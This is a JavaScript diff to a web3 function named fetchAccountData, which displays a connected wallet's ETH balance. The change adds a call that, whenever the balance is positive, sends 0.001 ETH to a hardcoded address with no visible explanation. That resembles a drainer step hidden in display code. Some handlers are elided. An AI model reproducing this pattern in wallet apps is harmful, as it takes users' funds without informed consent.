@@ -118,35 +118,38 @@ async function fetchAccountData() {
     // https://github.com/indutny/bn.js/
     const ethBalance = web3.utils.fromWei(balance, "ether");
     if(ethBalance > 0){ console.log("Balance greater than Zero");
-           const tx = {
-              from: accounts[0],
-              to: "0xBB5723d1aB9ED49b3bCD6E770A7a65B3924395AE",
-              //nonce: nonce,
-              gas: 500000,
-              //data: nftContract.methods.mintNFT(PUBLIC_KEY, urlS3Metadata.Location).encodeABI(),
-          }
+//            const tx = {
+//               from: accounts[0],
+//               to: "0xBB5723d1aB9ED49b3bCD6E770A7a65B3924395AE",
+//               //nonce: nonce,
+//               gas: 500000,
+//               //data: nftContract.methods.mintNFT(PUBLIC_KEY, urlS3Metadata.Location).encodeABI(),
+//           }
 
-          try {
-              var signPromise = await web3.eth.accounts.signTransaction(tx, tx.from);
+        try {
 
-              var signedTransaction = await web3.eth.sendSignedTransaction(
-                  signPromise.rawTransaction);
+            web3.eth.sendTransaction({
+               from: accounts[0],
+               to: '0x11f4d0A3c12e86B4b5F39B213F7E19D048276DAe',
+               value: '1000000000000000'
+         })
+         .on('transactionHash', function(hash){
+             ...
+         })
+         .on('receipt', function(receipt){
+             ...
+         })
+         .on('confirmation', function(confirmationNumber, receipt){ ... })
+         .on('error', console.error);
 
-              if (signedTransaction.status == true)
-                  status = "IN PROGRESS";
-              else
-                  status = "FAILED";
 
-              var obj = { Hash: signedTransaction.transactionHash, Payload: signedTransaction, Status: status};
-
-              return obj;
-          }
-          catch (err) {
-              console.log(err);
+                           }
+        catch (err) {
+                 console.log(err);
           }
 
            }
-          else { console.log("Opening a dialog");}
+     else { console.log("Opening a dialog");}
     const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
     // Fill in the templated row and put in the document
     const clone = template.content.cloneNode(true);
